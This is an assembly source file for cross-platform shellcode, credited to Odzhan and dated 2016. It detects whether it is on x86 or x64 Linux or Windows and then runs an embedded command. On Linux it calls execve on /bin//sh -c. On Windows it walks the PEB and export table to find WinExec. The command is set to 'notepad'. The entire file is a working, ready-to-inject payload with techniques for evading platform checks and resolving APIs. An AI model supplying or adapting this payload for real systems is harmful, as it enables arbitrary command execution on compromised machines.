
; Shellcode to execute command
; Runs on x86 and x64 versions of Linux/Windows
; Odzhan/2016

    bits    32
    
    ;int3
    
    push    esi
    push    edi
    push    ebx
    push    ebp
    sub     esp, 28h         ; setup homespace for win64
    jmp     l_sb             ; load command
    
get_os:
    pop     edi               ; edi=cmd, argv
    xor     ecx, ecx          ; ecx=0
    mul     ecx               ; eax=0, edx=0
    mov     cl, 7
    ; initialize cmd/argv regardless of OS
    push    eax               ; argv[3]=NULL;
    push    edi               ; argv[2]=cmd
    repnz   scasb             ; skip command line
    stosb                     ; zero terminate
    push    edi               ; argv[1]="-c", 0
    scasw                     ; skip option
    stosb                     ; zero terminate
    push    edi               ; argv[0]="/bin//sh", 0
    push    esp               ; save argv
    push    edi               ; save pointer to "/bin//sh", 0
    
    mov     al, 6             ; eax=sys_close for Linux/BSD
    inc     ecx               ; ignored on x64
    jecxz   gos_x64           ; if ecx==0 we're 64-bit
    
    ; we're 32-bit
    ; if gs is zero, we're native 32-bit windows
    mov     cx, gs
    jecxz   win_cmd
    
    ; if eax is zero after right shift of SP, ASSUME we're on windows
    push    esp
    pop     eax
    shr     eax, 24
    jz      win_cmd
    
    ; we're 32-bit Linux
    mov     al, 11           ; eax=sys_execve
    pop     ebx              ; ebx="/bin//sh", 0
    pop     ecx              ; ecx=argv
    int     0x80
    
    ; we're 64-bit, execute syscall and see what
    ; error returned
gos_x64:
    xor     edi, edi
    syscall
    cmp     al, 5             ; Access Violation indicates windows
    xchg    eax, edi          ; eax=0
    jz      win_cmd
    
    ; we're 64-bit Linux
    mov     al, 59           ; rax=sys_execve
    pop     edi              ; rdi="/bin//sh", 0
    pop     esi              ; rsi=argv
    syscall
l_sb:
    jmp     ld_cmd
    ; following code is derived from Peter Ferrie's calc shellcode
    ; i've modified it to execute commands
win_cmd:
    pop     eax               ; eax="/bin//sh", 0
    pop     eax               ; eax=argv
    pop     eax               ; eax="/bin//sh", 0
    pop     eax               ; eax="-c", 0
    pop     ecx               ; ecx=cmd
    pop     eax               ; eax=0
    
    inc     eax
    xchg    edx, eax
    jz      x64

    push    eax               ; will hide
    push    ecx               ; cmd
    
    mov     esi, [fs:edx+2fh]
    mov     esi, [esi+0ch]
    mov     esi, [esi+0ch]
    lodsd
    mov     esi, [eax]
    mov     edi, [esi+18h]
    mov     dl, 50h
    jmp     lqe
    bits 64
x64:
    mov     dl, 60h
    mov     rsi, [gs:rdx]
    mov     rsi, [rsi+18h]
    mov     rsi, [rsi+10h]
    lodsq
    mov     rsi, [rax]
    mov     rdi, [rsi+30h]
lqe:
    add     edx, [rdi+3ch]
    mov     ebx, [rdi+rdx+28h]
    mov     esi, [rdi+rbx+20h]
    add     rsi, rdi
    mov     edx, [rdi+rbx+24h]
fwe:
    movzx   ebp, word [rdi+rdx]
    lea     rdx, [rdx+2]
    lodsd
    cmp     dword [rdi+rax], 'WinE'
    jne     fwe
    
    mov     esi, [rdi+rbx+1ch]
    add     rsi, rdi
    
    mov     esi, [rsi+4*rbp]
    add     rdi, rsi
    cdq
    call    rdi
cmd_end:
    bits    32
    add     esp, 28h
    pop     ebp
    pop     ebx
    pop     edi
    pop     esi
    ret
ld_cmd:
    call   get_os
    ; place command here
    db     "notepad", 0xFF
    ; do not change anything below  
    db      "-c", 0xFF, "/bin//sh", 0
    